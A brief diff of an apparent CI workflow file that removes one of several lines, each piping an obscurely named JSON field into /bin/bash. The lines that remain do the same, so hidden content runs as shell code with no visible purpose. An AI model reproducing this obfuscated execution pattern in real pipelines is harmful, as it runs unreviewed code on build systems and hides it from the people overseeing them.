@@ -24,7 +24,6 @@ jobs:
           printf '%s' "$luh2" | jq -r .w791 | /bin/bash
           echo $uq4 | jq -r .clhe155 | /bin/bash
           echo $adhy73 | jq -r .if02688 | /bin/bash
-          echo $ftht072 | jq -r .biij478 | /bin/bash
           echo $sqmau9193 | jq -r .l6351 | /bin/bash
 
       - name: Archive artifact
